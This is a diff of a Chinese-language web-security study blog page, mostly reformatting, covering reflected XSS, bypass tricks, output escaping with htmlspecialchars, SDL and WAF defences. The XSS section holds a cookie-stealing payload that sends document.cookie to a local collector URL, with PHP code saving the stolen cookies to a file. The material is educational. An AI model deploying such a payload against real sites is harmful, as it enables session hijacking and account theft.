@@ -16,7 +16,8 @@
 <meta property="og:description" content="web安全工具以及一些招式实现原理以及测试思路的是靠更重要">
 <meta property="og:image" content="http://ww4.sinaimg.cn/large/0069oIoUgy1fpj0x87rfij30jw0b9q4j.jpg">
 <meta property="og:image" content="http://ww3.sinaimg.cn/large/0069oIoUgy1fpj1fd28poj30jd0b0gnc.jpg">
-<meta property="og:updated_time" content="2018-03-26T03:52:12.287Z">
+<meta property="og:image" content="http://ww4.sinaimg.cn/large/0069oIoUgy1fpou23etcwj30bu06p3za.jpg">
+<meta property="og:updated_time" content="2018-03-26T03:56:34.481Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="web安全">
 <meta name="twitter:description" content="web安全工具以及一些招式实现原理以及测试思路的是靠更重要">
@@ -225,7 +226,7 @@ webshell文件
 </code></pre><h3 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a>反射型xss</h3><pre><code>攻击代码在url里输出在http响应中
 攻击思路：
 ![image](http://ww2.sinaimg.cn/large/0069oIoUgy1fpo75xaaplj30dx0ah75t.jpg)
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">用于攻击的js代码(需要进行urldecode)</span><br><span class="line">&lt;script&gt;document.location=<span class="string">'http://127.0.0.1/cookie.php?cookie='</span>+document.cookie&lt;/script&gt;</span><br><span class="line">服务端代码；将前面劫持来的cookie写入text文本中</span><br><span class="line">&lt;?php</span><br><span class="line">    <span class="variable">$cookie</span>=<span class="variable">$_GET</span>[<span class="string">'cookie'</span>];</span><br><span class="line"> file_put_contents(<span class="string">'cookie.txt'</span>,<span class="variable">$cookie</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> 用于攻击的js代码(需要进行urldecode)</span><br><span class="line">&lt;script&gt;document.location=<span class="string">'http://127.0.0.1/cookie.php?cookie='</span>+document.cookie&lt;/script&gt;</span><br><span class="line"> 服务端代码；将前面劫持来的cookie写入text文本中</span><br><span class="line"> &lt;?php</span><br><span class="line">     <span class="variable">$cookie</span>=<span class="variable">$_GET</span>[<span class="string">'cookie'</span>];</span><br><span class="line">	 file_put_contents(<span class="string">'cookie.txt'</span>,<span class="variable">$cookie</span>);</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure>
 
 绕过方法：
     1.大小写混写
@@ -237,37 +238,14 @@ webshell文件
 </code></pre><p>预防方法：<br>   1.过滤用户输入白名单（在服务端限制输入长度）<br>   2.输出过滤使用htmlspecialchars（将一些特殊的符号转换成html编码）该函数默认不编码单引号或者使用js转义<br>     &amp;  =&gt;&amp;<br>     “  =&gt;&quot;<br>     ‘  =&gt;&apos;<br>     &lt;  =&gt;&lt;<br>     &gt;  =&gt;&gt;</p>
 <h2 id="web安全框架建设"><a href="#web安全框架建设" class="headerlink" title="web安全框架建设"></a>web安全框架建设</h2><pre><code>### 企业的sdl（安全开发生产周期）流程：
     提升web应用的安全性，减少web应用的安全漏洞。
-   ![image](http://ww4.sinaimg.cn/large/0069oIoUgy1fpou23etcwj30bu06p3za.jpg)
-</code></pre><h3 id="漏洞和事件处理："><a href="#漏洞和事件处理：" class="headerlink" title="漏洞和事件处理："></a>漏洞和事件处理：</h3><pre><code>发现方法：
+</code></pre><p>   <img src="http://ww4.sinaimg.cn/large/0069oIoUgy1fpou23etcwj30bu06p3za.jpg" alt="image"></p>
+<h3 id="漏洞和事件处理："><a href="#漏洞和事件处理：" class="headerlink" title="漏洞和事件处理："></a>漏洞和事件处理：</h3><pre><code>发现方法：
   1.安全需求分析
          使用web框架和语言的选型建议
          敏感信息如密码的保存方案（如加盐后强hash的方案）
          是否有上传功能
-  2.安全扫描：
-       通过扫描器发现安全问题
-       自动化
-       周期性执行
-  3.入侵检测
-       项目上线之后进行监控
-       包含多种检测方式
-       通过监控入侵行为发现安全问题    
-  4.日志分析
-     可疑日志+人工分析
-     可疑日志+扫描器
-  5.简历src（安全应急响应中心）    
-处理方法:
-   1.输入检查
-      在服务端检查
-      数据合法性校验：类型，范围，长度
-      尽可能使用‘白名单’    
-   2.    输出检查
-         在数据输出的点，也需要做一些特定的过滤和转义
-         比如xss，输出到html标签时就需要进行html编码    
-   3.waf防御
-       web application firewall
-       web应用防火墙
-       能够拦截攻击，如针对sql注入，xss和远程代码执行等漏洞进行的攻击
-</code></pre>
+</code></pre><p> 2.安全扫描：<br>             通过扫描器发现安全问题<br>             自动化<br>             周期性执行<br>  3.入侵检测<br>             项目上线之后进行监控<br>             包含多种检测方式<br>             通过监控入侵行为发现安全问题<br>        4.日志分析<br>           可疑日志+人工分析<br>           可疑日志+扫描器<br>        5.简历src（安全应急响应中心）<br>      处理方法:<br>         1.输入检查<br>            在服务端检查<br>            数据合法性校验：类型，范围，长度<br>            尽可能使用‘白名单’<br>      2.输出检查<br>               在数据输出的点，也需要做一些特定的过滤和转义<br>               比如xss，输出到html标签时就需要进行html编码<br>    3.waf防御<br>             web application firewall<br>             web应用防火墙<br>             能够拦截攻击，如针对sql注入，xss和远程代码执行等漏洞进行的攻击</p>
+
       
 
       
